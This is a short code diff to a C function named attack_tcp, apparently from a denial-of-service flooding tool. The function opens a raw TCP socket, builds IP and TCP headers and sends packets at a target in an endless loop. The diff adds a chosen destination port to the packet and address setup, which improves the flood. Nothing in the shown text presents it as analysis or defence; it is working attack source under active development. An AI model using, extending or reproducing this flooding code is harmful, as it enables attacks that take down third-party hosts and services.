@@ -19,7 +19,7 @@ void attack_tcp(struct target_data *target)
 	seed_rand(time(NULL));
 
 	target->addr.sin_family = AF_INET;
-	target->addr.sin_port = 0;
+	target->addr.sin_port = target->target_port == 0 ? 0 : htons(target->target_port);
 	target->addr.sin_addr.s_addr = target->target_addr;
 	target->sockfd = init_socket(IPPROTO_TCP);
 
@@ -43,7 +43,7 @@ void attack_tcp(struct target_data *target)
 	while (1) {
 		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
 			IPPROTO_TCP, target->target_addr);
-		build_tcp(iph, tcph, flag);
+		build_tcp(iph, tcph, flag, target->target_port);
 
 		if (sendto(target->sockfd, buffer, iph->length, 0,
 				(struct sockaddr *)&target->addr,
